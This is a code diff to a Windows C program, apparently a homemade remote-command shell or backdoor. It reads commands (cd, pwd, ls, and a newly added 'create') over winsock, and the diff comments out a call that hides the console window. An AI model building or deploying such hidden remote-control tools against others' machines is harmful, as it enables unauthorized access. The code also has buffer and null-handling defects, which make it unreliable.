@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <winsock2.h>
 #include <windows.h>
+#include <string.h>
 #pragma comment(lib,"ws2_32.lib")
 
 char buff[1024];
@@ -12,7 +13,22 @@ void pwd(){
     strcpy(buff,val);
     printf("%s\n",buff);
 }
-
+//Dont use createfile as name of function cause same as windows built-in function
+void fcreate(char my[]){
+    const char *arr;
+    arr = strtok(my," ");
+    int count = 1;
+    while(count--){
+        arr = strtok(NULL," ");
+    }
+    // LPCSTR Filename ;
+    // strcpy(Filename,arr);
+    // HANDLE filehandler ;
+    // filehandler = CreateFileA(arr,GENERIC_READ | GENERIC_WRITE,2,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    FILE *fptr;
+    fptr = fopen(arr,"w");
+    fclose(fptr);
+}
 void changedirectory(char *my){
     char arr[strlen(my)];
     int i;
@@ -61,6 +77,7 @@ void shell(char my[]){
     char *arr,b1[strlen(my)+1];
     strcpy(b1,my);
     arr = strtok(b1," ");
+    printf("the first word is %s \n",arr);
     if(strcmp(arr,"cd") == 0){
         changedirectory(my);
     }
@@ -72,11 +89,14 @@ void shell(char my[]){
     }else if(strcmp(my,"ls") == 0){
         ls();
     }
+    else if(strcmp(arr,"create") == 0){
+        fcreate(my);
+    }
     else
         printf("no cmd found ...\n");
 }
 int main(){
-    FreeConsole();
+    // FreeConsole();
     WSADATA wsd;
     int res = WSAStartup(MAKEWORD(2,2),&wsd);
     if(res == SOCKET_ERROR){
